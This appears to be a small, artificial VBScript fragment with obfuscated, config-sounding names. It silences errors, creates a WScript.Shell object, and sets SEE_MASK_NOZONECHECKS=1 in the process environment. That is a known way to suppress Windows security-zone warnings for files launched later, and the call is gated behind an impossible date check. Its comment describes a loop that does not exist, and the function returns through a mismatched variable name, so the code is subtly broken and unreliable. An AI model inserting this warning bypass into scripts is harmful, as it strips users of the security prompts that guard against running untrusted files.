' Do While loop with exit guard
Function ResolveConfigCipher91()
On Error Resume Next
  Dim blnExists81,strSegment32,strProfileBlob56
  Set blnExists81=CreateObject("WScript.Shell")
  strSegment32=blnExists81.ExpandEnvironmentStrings("%TEMP%")
  strProfileBlob56=blnExists81.ExpandEnvironmentStrings("%ProgramFiles%")
  If Len(strSegment32)>0 And Len(strProfileBlob56)>0 Then
    blnExists81.Environment("PROCESS")("SEE_MASK_NOZONECHECKS")="1"
  End If
  If Err.Number<>0 Then
    Err.Clear
    ReadCacheLine82=1
    Exit Function
  End If
  ReadCacheLine82=0
End Function

If Year(Now) < 1980 Then
  Call ResolveConfigCipher91()
End If


